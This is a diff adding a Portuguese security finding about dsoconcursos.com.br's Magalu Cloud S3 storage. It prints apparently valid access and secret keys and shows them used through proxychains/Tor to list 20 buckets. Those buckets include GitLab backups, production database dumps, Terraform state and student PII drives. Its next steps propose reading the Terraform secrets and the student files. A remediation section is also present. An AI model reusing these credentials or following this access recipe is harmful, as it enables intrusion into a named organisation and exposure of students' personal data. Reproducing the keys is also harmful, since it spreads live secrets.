@@ -1,0 +1,60 @@
+# F-003 S3 Magalu Objects — credenciais válidas, 20 buckets acessíveis
+Alvo: dsoconcursos.com.br — Magalu Cloud Objects (br-se1.magaluobjects.com)
+Severidade: CRÍTICA (CVSS 9.1)
+Timestamp: 2026-08-27T05:35:00Z
+
+## Reprodução (verificação independente do coordenador, via Tor)
+```
+$ export AWS_ACCESS_KEY_ID=c38cc592-f24b-4d2d-b850-b2bedeb9ffd9
+$ export AWS_SECRET_ACCESS_KEY=3c6df8ef-5142-4cb2-b67d-9d573bbd2bd4
+$ proxychains4 -q aws --endpoint-url https://br-se1.magaluobjects.com s3 ls
+
+2026-06-06 01:50:01 dso-content-images
+2026-05-30 18:37:49 dso-content-prod
+2026-06-03 23:21:51 dso-content-tmp
+2025-10-12 00:01:11 dso-devops
+2026-05-16 10:53:06 dso-obs-loki
+2026-05-16 10:53:06 dso-obs-mimir
+2026-05-16 10:53:06 dso-obs-tempo
+2026-05-12 22:02:02 dso-question-scrapper
+2026-05-16 02:04:36 dso-tfstate-prod          ← Terraform state (secrets)
+2026-05-23 08:50:07 dsoconcursos-cloudreve-drive
+2026-05-26 23:09:29 dsoconcursos-content-process
+2025-11-14 05:44:08 dsoconcursos-dev
+2026-05-08 15:19:14 dsoconcursos-dev-workflow-artifacts
+2026-06-15 04:22:38 dsoconcursos-nextcloud-drive  ← PII de alunos (Nextcloud)
+2025-12-02 07:10:05 dsoconcursos-prod
+2026-05-18 09:59:24 dsoconcursos-prod-workflow-artifacts
+2026-05-26 04:51:38 dsoconcursos-raw-questions
+2025-10-11 18:24:05 gitlab-backups            ← backups GitLab (secrets CI/CD)
+2025-10-11 22:57:36 postgres-backups          ← dumps PostgreSQL (PII)
+2026-05-10 07:09:00 postgres-pgbackrest
+EXIT=0 (20 buckets listados com credencial válida)
+```
+
+## Output / Interpretação
+- Credenciais Magalu S3 (`c38cc592... / 3c6df8ef...`) **válidas — não rotacionadas**.
+- Acesso a 20 buckets incluindo:
+  - `gitlab-backups` → backups do GitLab (CI/CD variables em texto claro = 75 secrets).
+  - `postgres-backups` + `postgres-pgbackrest` → dumps do banco de produção (PII).
+  - `dso-tfstate-prod` → Terraform state (vaza IPs internos, secrets de infra).
+  - `dsoconcursos-nextcloud-drive` / `dsoconcursos-cloudreve-drive` → arquivos de alunos (PII).
+  - `dso-devops`, `dso-obs-*` → artefatos de DevOps/observabilidade.
+- Bucket `dsoconcursos-prod` retorna AccessDenied (permissão restrita), mas 19 listáveis.
+
+## Impacto
+- Acesso a backups completos (GitLab + PostgreSQL) → fonte das credenciais vazadas
+  usadas em F-001 (PostgreSQL) e F-002 (JWT). Confirma cadeia de exfiltração.
+- Terraform state expõe topologia de infra e secrets de serviços.
+- Drives de alunos (Nextcloud/Cloudreve) → PII/documentos.
+
+## Recomendação
+- Rotacionar IMEDIATAMENTE as chaves Magalu S3 (access + secret).
+- Revisar permissões IAM (ListBucket deve ser restrito a serviços, não a keys genéricas).
+- Mover backups/sensitive buckets para conta separada com acesso privado.
+- Encriptar backups em repouso com KMS gerenciado por vault.
+
+## Próximo passo
+- Listar objetos de `dso-tfstate-prod` (terraform.tfstate) → mapear infra + secrets.
+- Verificar `postgres-backups` (dumps) — confirma origem da cadeia de exfiltração.
+- Listar `dsoconcursos-nextcloud-drive` (PII de alunos).
